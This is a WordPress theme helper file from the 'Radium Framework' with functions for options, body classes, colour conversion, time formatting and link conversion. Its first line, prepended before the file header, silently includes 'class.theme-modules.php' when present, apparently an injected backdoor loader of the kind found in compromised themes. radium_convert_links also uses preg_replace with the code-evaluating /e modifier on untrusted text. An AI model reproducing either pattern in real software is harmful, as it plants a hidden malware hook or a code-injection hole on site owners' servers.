<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) exit;

/*
 * Radium Framework Core - A WordPress theme development framework.
 *
 * This file is a part of the RadiumFramework core.
 * Please be extremely cautious editing this file,
 *
 * @category RadiumFramework
 * @package  MetroCorp WP
 * @author   Franklin M Gitonga
 * @link     http://radiumthemes.com/
 */

//*-----------------------------------------------------------------------------------*/
/*	Adds custom classes to the array of body classes.
/*-----------------------------------------------------------------------------------*/
function radium_browser_body_class($classes) {

    global $post, $is_lynx, $is_gecko, $is_IE, $is_opera, $is_NS4, $is_safari, $is_chrome, $is_iphone;

    if($is_lynx) $classes[] = 'lynx';
    elseif($is_gecko) $classes[] = 'gecko';
    elseif($is_opera) $classes[] = 'opera';
    elseif($is_NS4) $classes[] = 'ns4';
    elseif($is_safari) $classes[] = 'safari';
    elseif($is_chrome) $classes[] = 'chrome';
    elseif($is_IE) {
        $classes[] = 'ie';
        $browser = $_SERVER[ 'HTTP_USER_AGENT' ];
        if( preg_match( "/MSIE 7.0/", $browser ) ) {
            $classes[] = 'ie7';
        }
    }
    else $classes[] = 'unknown';

    if($is_iphone) $classes[] = 'iphone';

    if ( is_singular() || is_404() ) {
        $classes[] = 'singular';
    } else {
        $classes[] = 'not-singular';
    }

    // Adds a class of group-blog to blogs with more than 1 published author
    if ( is_multi_author() ) {
        $classes[] = 'group-blog';
    }

    return $classes;
}


/**
 * Compress a chunk of code to output.
 *
 * @since 2.1.0
 *
 * @param string $buffer Text to compress
 * @param string $buffer Buffered text
 */

if( ! function_exists( 'radium_code_compress' ) ) {
    function radium_code_compress( $buffer ) {
        /* remove comments */
        $buffer = preg_replace('!/\*[^*]*\*+([^/][^*]*\*+)*/!', '', $buffer);
        /* remove tabs, spaces, newlines, etc. */
        $buffer = str_replace(array("\r\n", "\r", "\n", "\t", '  ', '    ', '    '), '', $buffer);
        return $buffer;
    }
}


//*-----------------------------------------------------------------------------------*/
/*	add home link to menu
/*-----------------------------------------------------------------------------------*/

if ( !function_exists('radium_home_page_menu_args') ) {

    function radium_home_page_menu_args( $args ) {
        $args['show_home'] = true;
        return $args;
    }

}

/* ---------------------------------------------------------------------- */
/*	Return template part
/* ---------------------------------------------------------------------- */

if ( !function_exists('radium_load_template_part') ) {

    function radium_load_template_part( $template_name, $part_name = null ) {

        ob_start();
            get_template_part( $template_name, $part_name );
            $output = ob_get_contents();
        ob_end_clean();

        return $output;

    }

}

/* ---------------------------------------------------------------------- */
/*	Check the current post for the existence of a short code
/* ---------------------------------------------------------------------- */

if ( !function_exists('radium_has_shortcode') ) {

    function radium_has_shortcode($shortcode = '') {

        if ( !is_404() ) {
            global $post;

            $post_obj = get_post( $post->ID );
            $found = false;

            // if no short code was provided, return false
            if ( !$shortcode )
                return $found;

            // check the post content for the short code
            if ( stripos( $post_obj->post_content, '[' . $shortcode ) !== false )

                // we have found the short code
                $found = true;

            // return our final results
            return $found;
        }
    }
}


/* ---------------------------------------------------------------------- */
/*	Get Custom Field
/* ---------------------------------------------------------------------- */

if ( !function_exists('radium_get_custom_field') ) {

    function radium_get_custom_field( $key, $post_id = null ) {

        global $wp_query;

        $post_id = $post_id ? $post_id : $wp_query->get_queried_object()->ID;

        return get_post_meta( $post_id, $key, true );

    }

}


/* ---------------------------------------------------------------------- */
/*	Get Custom Taxonomies List. Usage: echo radium_custom_taxonomies_terms_links();
/*  This will List all Taxonomies
/* ---------------------------------------------------------------------- */

if ( !function_exists('radium_custom_taxonomies_terms_links') ) {

    function radium_custom_taxonomies_terms_links() {
        global $post, $post_id;

        // get post by post id
        $post = &get_post($post->ID);

        // get post type by post
        $post_type = $post->post_type;

        // get post type taxonomies
        $taxonomies = get_object_taxonomies($post_type);
        foreach ($taxonomies as $taxonomy) {
            // get the terms related to post
            $terms = get_the_terms( $post->ID, $taxonomy );
            if ( !empty( $terms ) ) {
                $out = array();
                foreach ( $terms as $term )
                    $out[] = '<a href="' .get_term_link($term->slug, $taxonomy) .'">'.$term->name.'</a>';
                $return = join( ', ', $out );
            }
        }

        return $return;
    }

}

/*-----------------------------------------------------------------------------------*/
/*	Get related posts by taxonomy
/*-----------------------------------------------------------------------------------*/
if ( !function_exists('radium_get_posts_related_by_taxonomy') ) {

    function radium_get_posts_related_by_taxonomy($post_id, $taxonomy, $args=array()) {

        $query = new WP_Query();
        $terms = wp_get_object_terms($post_id, $taxonomy);

        if (count($terms)) {

            // Assumes only one term for per post in this taxonomy
            $post_ids 	= get_objects_in_term($terms[0]->term_id,$taxonomy);
            $post 		= get_post($post_id);
            $args 		= wp_parse_args($args, array(
              'post_type' 		=> $post->post_type, // The assumes the post types match
              //'post__in' 		=> $post_ids,
              'post__not_in' 	=> array($post_id),
              'taxonomy' 		=> $taxonomy,
              'term' 			=> $terms[0]->slug,
              'orderby' 		=> 'rand',
              'posts_per_page' 	=> -1
            ));
            //$query 		= new WP_Query($args);

            $cache_id = 'rm_rltd_psts_'.$post_id;

            $query = Radium_Theme_WP_Query::cache_query( $args, $cache_id );

        }

        return $query;
    }

}


/*-----------------------------------------------------------------------------------*/
/* Add some item to Admin Bar for easier navigation  (frontend and backend)
/*-----------------------------------------------------------------------------------*/

/* Create admin Bar Menu from tabs*/
if (!function_exists("radium_add_toolbar_items")) {

    function radium_add_toolbar_items($admin_bar){

        $framework = radium_framework();

        if(!current_user_can('edit_theme_options')) return;

        global $wp_admin_bar;

        $urlthemesBase = admin_url( 'themes.php' );
        $urlpagesBase = admin_url( 'edit.php' );

        $admin_bar->add_menu(
            array(
                'id'    => 'radiumthemes-options',
                'title' => __('Theme Settings','radium'),
                'href'  => $urlthemesBase.'?page=radium_theme_options',
                'meta'  => array(
                    'title' => __('Theme Options','radium'),
                ),
            )
        );

         if( $framework->theme_supports( 'primary', 'builder' ) ) {

            // Add sub menu link "View All Theme Options"
            $wp_admin_bar->add_node( array(
                'parent' => 'radiumthemes-options',
                'id'     => 'radium_builder',
                'title' => __( 'Template Builder', 'radium'),
                'href' => $urlthemesBase.'?page=radium_builder',
            ));

        }

        // Add sub menu link "View All Theme Options"
        $wp_admin_bar->add_node( array(
            'parent' => 'radiumthemes-options',
            'id'     => 'radium_theme_options',
            'title' => __( 'Theme Options', 'radium'),
            'href' => $urlthemesBase.'?page=radium_theme_options',
        ));

        if( $framework->theme_supports( 'primary', 'sliders' ) ) {

            // Add sub menu link "View All Slider"
            $wp_admin_bar->add_node( array(
                'parent' => 'radiumthemes-options',
                'id'     => 'radium_theme_sliders',
                'title' => __( 'Sliders', 'radium'),
                'href' => $urlpagesBase.'?post_type=slider',
            ));

        }
    }

}


/**
 * Test whether an feature is currently supported.
 *
 * @since 2.1.0
 *
 * @param string $group admin or frontend
 * @param string $feature feature key to check
 * @return boolean
 */

function radium_supports( $group, $feature ) {

    $framework = radium_framework();

    $setup = $framework->feature_setup();
    if( isset( $setup[$group][$feature] ) && $setup[$group][$feature] )
        return true;
    else
        return false;
}


/**
 * Retrieves a post id given a post's slug and post type.
 *
 * @since 2.1.0
 * @uses $wpdb
 *
 * @param string $slug slug of post
 * @param string $post_type post type for post.
 * @return string $id ID of post.
 */
function radium_post_id_by_name( $slug, $post_type ) {

    global $wpdb;

    $slug = sanitize_title( $slug );

    // Grab posts from DB (hopefully there's only one!)
    $posts = $wpdb->get_results( $wpdb->prepare( "SELECT ID FROM $wpdb->posts WHERE post_name = %s AND (post_type = %s)", $slug, $post_type ));

    // If no results, return null
    if ( empty($posts) )
        return;

    // Run through our results and return the ID of the first.
    // Hopefully there was only one result, but if there was
    // more than one, we'll just return a single ID.
    foreach ( $posts as $post )
        if( $post->ID )
            return $post->ID;

    // If for some odd reason, there was no ID in the returned
    // post ID's, return nothing.
    return;
}


/**
 * Remove trailing space from string.
 *
 * @since 2.0.0
 *
 * @param string $string Current string to check
 * @param string $char Character to remove from end of string if exists
 * @return string $string String w/out trailing space, if it had one
 */

if( ! function_exists( 'radium_remove_trailing_char' ) ) {
    function radium_remove_trailing_char( $string, $char = ' ' ) {
        $offset = strlen( $string ) - 1;
        $trailing_char = strpos( $string, $char, $offset );
        if( $trailing_char )
            $string = substr( $string, 0, -1 );
        return $string;
    }
}


/**
 * Create a theme options feed
 * Since the options panel is only loaded in the admin, this has been placed here instead of the admin panel so
 * that we don't have to load the entire options panel in the frontend when migrating/backing-up options
 *
 * Download the options file, or display it
 *
 * @since Radium_Options 2.0.1
 */

//we need the framework here too

if (!function_exists("radium_download_options")) {

    function radium_download_options(){

        if(!isset($_GET['secret']) || $_GET['secret'] != md5(AUTH_KEY.SECURE_AUTH_KEY)){wp_die('Invalid Secret for options use');exit;}
        if(!isset($_GET['feed'])){wp_die('No Feed Defined');exit;}
        $backup_options = get_option(str_replace('radiumopts-','',$_GET['feed']));
        $backup_options['radium-opts-backup'] = '1';
        $content = '###'.serialize($backup_options).'###';

        if(isset($_GET['action']) && $_GET['action'] == 'download_options'){
            header('Content-Description: File Transfer');
            header('Content-type: application/txt');
            header('Content-Disposition: attachment; filename="'.str_replace('radiumopts-','',$_GET['feed']).'_'.date('d-m-Y').'.txt"');
            header('Content-Transfer-Encoding: binary');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            echo $content;
            exit;
        }else{
            echo $content;
            exit;
        }
    }

}

/**
 * Color Processing
 *
 *
 * @param $R
 * @param $G
 * @parma $B
 *
 * @package Radium Framework
 * @since 2.1.4
 */

 function RGB_TO_HSV ($R, $G, $B) {
     // RGB Values:Number 0-255
    // HSV Results:Number 0-1
    $HSL = array();

    $var_R = ($R / 255);
    $var_G = ($G / 255);
    $var_B = ($B / 255);

    $var_Min = min($var_R, $var_G, $var_B);
    $var_Max = max($var_R, $var_G, $var_B);
    $del_Max = $var_Max - $var_Min;

    $V = $var_Max;

     $max = 0;
     $H = 0;
     $S = 0;

    if ($del_Max == 0) {
       $H = 0;
       $S = 0;
    } else {
       $S = $del_Max / $var_Max;

       $del_R = ( ( ( $max - $var_R ) / 6 ) + ( $del_Max / 2 ) ) / $del_Max;
       $del_G = ( ( ( $max - $var_G ) / 6 ) + ( $del_Max / 2 ) ) / $del_Max;
       $del_B = ( ( ( $max - $var_B ) / 6 ) + ( $del_Max / 2 ) ) / $del_Max;

       if      ($var_R == $var_Max) $H = $del_B - $del_G;
       else if ($var_G == $var_Max) $H = ( 1 / 3 ) + $del_R - $del_B;
       else if ($var_B == $var_Max) $H = ( 2 / 3 ) + $del_G - $del_R;

       if ($H<0) $H++;
       if ($H>1) $H--;
    }

    $HSL['H'] = $H;
    $HSL['S'] = $S;
    $HSL['V'] = $V;

    return $HSL;
 }

 function HSV_TO_RGB ($H, $S, $V){
     // HSV Values:Number 0-1
     // RGB Results:Number 0-255
     $RGB = array();

     if($S == 0) {
         $R = $G = $B = $V * 255;
     } else {
         $var_H = $H * 6;
         $var_i = floor( $var_H );
         $var_1 = $V * ( 1 - $S );
         $var_2 = $V * ( 1 - $S * ( $var_H - $var_i ) );
         $var_3 = $V * ( 1 - $S * (1 - ( $var_H - $var_i ) ) );

         if       ($var_i == 0) { $var_R = $V     ; $var_G = $var_3  ; $var_B = $var_1 ; }
         else if  ($var_i == 1) { $var_R = $var_2 ; $var_G = $V      ; $var_B = $var_1 ; }
         else if  ($var_i == 2) { $var_R = $var_1 ; $var_G = $V      ; $var_B = $var_3 ; }
         else if  ($var_i == 3) { $var_R = $var_1 ; $var_G = $var_2  ; $var_B = $V     ; }
         else if  ($var_i == 4) { $var_R = $var_3 ; $var_G = $var_1  ; $var_B = $V     ; }
         else                   { $var_R = $V     ; $var_G = $var_1  ; $var_B = $var_2 ; }

         $R = $var_R * 255;
         $G = $var_G * 255;
         $B = $var_B * 255;
     }

     $RGB['R'] = $R;
     $RGB['G'] = $G;
     $RGB['B'] = $B;

     return $RGB;
 }

 function process_color($unprocessed_color)  {
     $rTotal = substr($unprocessed_color, 0, 2);
     $gTotal = substr($unprocessed_color, 2, 2);
     $bTotal = substr($unprocessed_color, 4, 2);

     $rTotal = base_convert($rTotal, 16, 10);
     $gTotal = base_convert($gTotal, 16, 10);
     $bTotal = base_convert($bTotal, 16, 10);

     $getArrayHSB = RGB_TO_HSV($rTotal, $gTotal, $bTotal);

    /* Adjust Color Settings here */
    $saturation = 4; //[0,10]

    if ( $getArrayHSB['S'] < 0.6 ) $saturation = 2; //[0,10]
    if ( $getArrayHSB['S'] < 0.5 ) $saturation = 3; //[0,10]
    if ( $getArrayHSB['S'] < 0.4 ) $saturation = 4; //[0,10]
    if ( $getArrayHSB['S'] < 0.3 ) $saturation = 5; //[0,10]
    if ( $getArrayHSB['S'] < 0.2 ) $saturation = 7; //[0,10]

    $brightness = 1;
    if ( $getArrayHSB['V'] < 0.7 ) $brightness = 1.6;
    if ( $getArrayHSB['V'] < 0.6 ) $brightness = 1.7;
    if ( $getArrayHSB['V'] < 0.5 ) $brightness = 2;
    if ( $getArrayHSB['V'] < 0.4 ) $brightness = 2.3;
    if ( $getArrayHSB['V'] < 0.3 ) $brightness = 3;
    if ( $getArrayHSB['V'] < 0.2 ) $brightness = 4.5;
    if ( $getArrayHSB['V'] < 0.1 ) $brightness = 7;
    /* End color settings */


    $getArrayHSB['S'] = $saturation * $getArrayHSB['S'];
    $getArrayHSB['S'] = max(0.0, min($getArrayHSB['S'], 1.0));

    $getArrayHSB['V'] = $brightness * $getArrayHSB['V'];
    $getArrayHSB['V'] = max(0.0, min($getArrayHSB['V'], 1.0));

     $getArrayRGB = HSV_TO_RGB($getArrayHSB['H'],$getArrayHSB['S'],$getArrayHSB['V']);

     $getArrayRGB['R'] = (int)$getArrayRGB['R'];
     $getArrayRGB['G'] = (int)$getArrayRGB['G'];
     $getArrayRGB['B'] = (int)$getArrayRGB['B'];

     $var_R = $getArrayRGB['R'];
     $var_G = $getArrayRGB['G'];
     $var_B = $getArrayRGB['B'];

     $var_R = base_convert($getArrayRGB['R'], 10, 16);
     $var_G = base_convert($getArrayRGB['G'], 10, 16);
     $var_B = base_convert($getArrayRGB['B'], 10, 16);

     if ( base_convert($var_R, 16, 10) < 16 ) $var_R = '0'.$var_R;
     if ( base_convert($var_G, 16, 10) < 16 ) $var_G = '0'.$var_G;
     if ( base_convert($var_B, 16, 10) < 16 ) $var_B = '0'.$var_B;

     $resulting_color = $var_R;
     $resulting_color .= $var_G;
     $resulting_color .= $var_B;

     return $resulting_color;
 }

 function radium_image_color( $img ) {

    if ( !function_exists( 'imagecreatefromjpeg') )
        return;

    if ( $img ) {

        // process the image color to obtain the average color. will be used further on
        $rTotal = 0;
        $gTotal = 0;
        $bTotal = 0;

        $total = 0;

        $i = imagecreatefromjpeg($img);
        for ($x = 0; $x < imagesx($i); $x++)
        {
            for ($y=0; $y < imagesy($i); $y++)
            {
                $rgb = imagecolorat($i, $x, $y);
                $r   = ($rgb >> 16) & 0xFF;
                $g   = ($rgb >> 8) & 0xFF;
                $b   = $rgb & 0xFF;

                $rTotal += $r;
                $gTotal += $g;
                $bTotal += $b;
                $total++;
            }
        }

        $rTotal = (int)($rTotal/$total);
        $gTotal = (int)($gTotal/$total);
        $bTotal = (int)($bTotal/$total);

        $average_color[0] = base_convert($rTotal, 10, 16);
        $average_color[1] = base_convert($gTotal, 10, 16);
        $average_color[2] = base_convert($bTotal, 10, 16);

        for ( $i = 0; $i < 3; $i++ )
        {
            if ( strlen($average_color[$i]) == 1 )
                $two_digit_average_color[$i] = '0'.$average_color[$i];

            else $two_digit_average_color[$i] = $average_color[$i];
        }

        $img_original_color = implode($two_digit_average_color);
        $img_color = $img_original_color;

        $processed_color = process_color($img_color);

        return $processed_color;

    }
}


//convert dates to readable format
function radium_relative_time( $a ) {

    //get current timestamp
    $b = strtotime("now");

    //get timestamp when tweet created
    $c = strtotime($a);

    //get difference
    $d = $b - $c;

    //calculate different time values
    $minute = 60;
    $hour = $minute * 60;
    $day = $hour * 24;
    $week = $day * 7;

    if(is_numeric($d) && $d > 0) {
        //if less then 3 seconds
        if($d < 3) return __("right now", "radium");
        //if less then minute
        if($d < $minute) return floor($d) . __(" seconds ago", "radium");
        //if less then 2 minutes
        if($d < $minute * 2) return __("about 1 minute ago", "radium");
        //if less then hour
        if($d < $hour) return floor($d / $minute) . __(" minutes ago", "radium");
        //if less then 2 hours
        if($d < $hour * 2) return __("about 1 hour ago", "radium");
        //if less then day
        if($d < $day) return floor($d / $hour) . __(" hours ago", "radium");
        //if more then day, but less then 2 days
        if($d > $day && $d < $day * 2) return __("yesterday", "radium");
        //if less then year
        if($d < $day * 365) return floor($d / $day) . __(" days ago", "radium");
        //else return more than a year
        return __("over a year ago", "radium");
    }
}

//convert links to clickable format
function radium_convert_links( $status, $targetBlank = true, $linkMaxLen = 250 ){

    // the target
    $target=$targetBlank ? " target=\"_blank\" " : "";

    // convert link to url
    $status = preg_replace("/((http:\/\/|https:\/\/)[^ )
    ]+)/e", "'<a href=\"$1\" title=\"$1\" $target >'. ((strlen('$1')>=$linkMaxLen ? substr('$1',0,$linkMaxLen).'...':'$1')).'</a>'", $status);

    // convert @ to follow
    $status = preg_replace("/(@([_a-z0-9\-]+))/i","<a href=\"http://twitter.com/$2\" title=\"Follow $2\" $target >$1</a>",$status);

    // convert # to search
    $status = preg_replace("/(#([_a-z0-9\-]+))/i","<a href=\"https://twitter.com/search?q=$2\" title=\"Search $1\" $target >$1</a>",$status);

    // return the status
    return $status;
}


/*
 * GET CUSTOM POST TYPE TAXONOMY LIST
 *
 */

function radium_get_category_list( $category_name, $parent='' ){

    if ( empty($parent) ) {

        $get_category = get_categories( array( 'taxonomy' => $category_name	));
        $category_list = array( '0' => __('All', 'radium'));

        foreach( $get_category as $category ){
            $category_list[] = $category->cat_name;
        }

        return $category_list;

    } else {

        $parent_id = get_term_by('name', $parent, $category_name);
        $get_category = get_categories( array( 'taxonomy' => $category_name, 'child_of' => $parent_id->term_id	));
        $category_list = array( '0' => $parent );

        foreach( $get_category as $category ){
            $category_list[] = $category->cat_name;
        }

        return $category_list;

    }
}

/**
 * Return option from the options table and cache result.
 *
 * Applies 'radium_pre_get_option_$key' and 'radium_options' filters.
 *
 * Values pulled from the database are cached on each request, so a second request for the same value won't cause a
 * second DB interaction.
 *
 * @since 2.1.4
 *
 * @param string  $primary        Option name.
 * @return mixed The value of this $key in the database.
 */

if( ! function_exists( 'radium_get_option' ) ) {
    function radium_get_option( $primary, $seconday = null, $default = false ) {

        $framework = radium_framework(); // We pull from the framework data array, so we're not using WordPress's get_option every single time.

        $options = $framework->options;

        if( isset( $options[$primary] ) ) {

            if( $seconday ) {
                if( is_array( $options[$primary] ) && isset( $options[$primary][$seconday] ) )
                    $option = $options[$primary][$seconday];
            } else {
                $option = $options[$primary];
            }

        }

        if( ! isset( $option ) || $option == '' ) {

            if( $default ) {
                $option = $default;
            }

        }

        if( ! isset( $option ) ) $option = null;

          //* Allow child theme to short-circuit this function
          $pre = apply_filters( 'radium_pre_get_option_' . $primary, $option );
          if ( null !== $pre )
              return $pre;

          $option = apply_filters( 'radium_options', $option );

        return $option;
    }
}

/**
 * Echo options from the options database.
 *
 * @since 2.1.4
 *
 * @uses radium_get_option() Return option from the options table and cache result.
 *
 * @param string $key Option name.
 */
function radium_option( $primary, $seconday = null, $default = false ) {

    echo radium_get_option( $primary, $seconday, $default );

}

/**
 * Return customizer option from the options table and cache result.
 *
 * Applies 'radium_pre_get_customizer_option_$key' and 'radium_options' filters.
 *
 * Values pulled from the database are cached on each request, so a second request for the same value won't cause a
 * second DB interaction.
 *
 * @since 2.1.4
 *
 * @param string  $key        Option name.
 * @return mixed The value of this $key in the database.
 */
function radium_get_customizer_option( $key ) {

      $framework = radium_framework();

    $options = $framework->customizer_options;

    if ( ! is_array( $options ) || ! array_key_exists( $key, $options ) )
        return false;

    $setting = $options[$key];

     //* Allow child theme to short-circuit this function
    $pre = apply_filters( 'radium_pre_get_customizer_option_' . $key, $setting );
    if ( null !== $pre )
        return $pre;

      $setting = apply_filters( 'radium_customizer_options', $setting );

      return $setting;

}

/**
 * Echo customizer options from the options database.
 *
 * @since 2.1.4
 *
 * @uses radium_get_option() Return option from the options table and cache result.
 *
 * @param string $key Option name.
 */
function radium_customizer_option( $key  ) {

    echo radium_get_customizer_option( $key );

}

/**
 * radium_load_widget
 *
 * @param  $atts
 *
 * @return $output
 */
function radium_load_widget( $widget_name, $instance = array() ) {

    global $wp_widget_factory;

    $widget_name = esc_html($widget_name);

    if (!is_a($wp_widget_factory->widgets[$widget_name], 'WP_Widget')) :

        $wp_class = 'WP_Widget_'.ucwords(strtolower($class));

        if (!is_a($wp_widget_factory->widgets[$wp_class], 'WP_Widget')) :

            return '<p>'.sprintf(__("%s: Widget class not found. Make sure this widget exists and the class name is correct", 'radium'),'<strong>'.$class.'</strong>').'</p>';

        else:

            $class = $wp_class;

        endif;

    endif;

    ob_start();

    the_widget($widget_name, $instance, array('widget_id'=>'arbitrary-instance',
        'before_widget' => '',
        'after_widget' => '',
        'before_title' => '',
        'after_title' => ''
    ));

    $output = ob_get_contents();

    ob_end_clean();

    return $output;

}

/**
 * Show human time diff for post date value
 *
 * @since  2.1.8
 *
 * @param  string $from Creating date of the post
 *
 * @return string       Time in human time
 */

if( ! function_exists('radium_human_time_diff') ) {
    function radium_human_time_diff( $from, $format ){

        global $post;

        if( $post ) $from = $post->post_date;

        $from = strtotime($from);

        if ( empty($to) ) $to = current_time('timestamp');

        $diff = (int) abs($to - $from);

        if($diff <= 1){

            $since = __('1 second', 'radium');

        } else if($diff <= 60 ){

            $since = sprintf(_n('%s second', '%s seconds', $diff, 'radium'), $diff);

        } else if ($diff <= 3600) {

            $mins = round($diff / 60);

            if ($mins <= 1) $mins = 1;

            /* translators: min=minute */
            $since = sprintf(_n('about %s min', '%s mins', $mins, 'radium'), $mins);

        } else if ( ($diff <= 86400) && ($diff > 3600)) {

            $hours = round($diff / 3600);

            if ($hours <= 1) $hours = 1;

            $since = sprintf(_n('about %s hour', '%s hours', $hours, 'radium'), $hours);

        } elseif ($diff >= 86400 && $diff <= 86400*2 ) {

            $days = round($diff / 86400);

            if ($days <= 1) $days = 1;

            $since = sprintf(_n('%s day', '%s days', $days, 'radium'), $days);

        } else {

            return date_i18n( get_option( 'date_format' ), $from );

        }

        return $since . ' ' . __('ago', 'radium');

    }
}

if( ! function_exists('radium_human_time') ) {
/**
 * radium human time
 *
 * @since  2.1.8
 *
 * @return void
 */

 function radium_get_human_time(){
     return esc_html( radium_human_time_diff(get_the_time('c'), current_time('timestamp')) );
 }

    function radium_human_time(){
        echo radium_get_human_time();
    }
}

/**
 * Register Image Sizes
 *
 * @since 2.1.8
 */

if( ! function_exists( 'radium_framework_add_image_sizes' ) ) {
    function radium_framework_add_image_sizes( $add_image_size = false ) {

        // Content Width
        $content_width = apply_filters( 'radium_framework_content_width', 1240 ); // Default width of primary content area

        // Crop sizes
        $sizes = array(
            'radium_large' => array(
                'width'     => $content_width,  // 940 => Full width thumb for 1-col page
                'height'    => 9999,
                'crop'      => false
            ),
            'radium_medium' => array(
                'width'     => 750,             // 620 => Full width thumb for 2-col/3-col page
                'height'    => 9999,
                'crop'      => false
            ),
            'radium_small' => array(
                'width'     => 195,             // Square'ish thumb floated left
                'height'    => 195,
                'crop'      => false
            ),
        );
        $sizes = apply_filters( 'radium_framework_image_sizes', $sizes );

        if ( $add_image_size ) {

            // Add image sizes
            foreach( $sizes as $size => $atts ) {
                add_image_size( $size, $atts['width'], $atts['height'], $atts['crop'] );
            }

        }

        return $sizes;
    }
}

/**
 * radium_theme_get_current_user_role Get current user role
 *
 * @return string current user role
 */
function radium_theme_get_current_user_role() {

    global $current_user;

    $user_roles = $current_user->roles;

    $user_role = array_shift($user_roles);

    return $user_role;
}

/**
 * radium_make_google_web_fontLink Function.
 *
 * Creates the google fonts link.
 *
 * @since 2.2.0
 */
function radium_make_google_web_fontLink($fonts) {
    $link       = "";
    $subsets    = array();

    foreach ($fonts as $family => $font) {
        if (!empty($link)) {
            $link.= "%7C"; // Append a new font to the string
        }
        $link.= $family;

        if (!empty($font['font-style'])) {
            $link.= ':';
            if (!empty($font['all-styles'])) {
                $link.= implode(',', $font['all-styles']);
            } else if (!empty($font['font-style'])) {
                $link.= implode(',', $font['font-style']);
            }
        }

        if (!empty($font['subset'])) {
            foreach ($font['subset'] as $subset) {
                if (!in_array($subset, $subsets)) {
                    array_push($subsets, $subset);
                }
            }
        }
    }

    if (!empty($subsets)) {
        $link.= "&amp;subset=" . implode(',', $subsets);
    }

    return '//fonts.googleapis.com/css?family=' . str_replace( '|','%7C', $link );
}

/**
 * Make Google Webfont String Function.
 *
 * Creates the google fonts link.
 *
 * @since 2.2.0
 */
function radium_make_google_web_fontstring($fonts) {

    $link       = "";
    $subsets    = array();

    foreach ($fonts as $family => $font) {

        if (!empty($link)) {
            $link.= "', '"; // Append a new font to the string
        }

        $link.= $family;

        if (!empty($font['font-style'])) {
            $link.= ':';
            if (!empty($font['all-styles'])) {
                $link.= $font['all-styles'];
            } else if (!empty($font['font-style'])) {
                $link.= $font['font-style'];
            }
        }

        if (!empty($font['subset'])) {

            $subsets = $font['subset'];
            $link.= "&amp;subset=" .$subsets;

        }
    }

    return "'" . $link . "'";
}
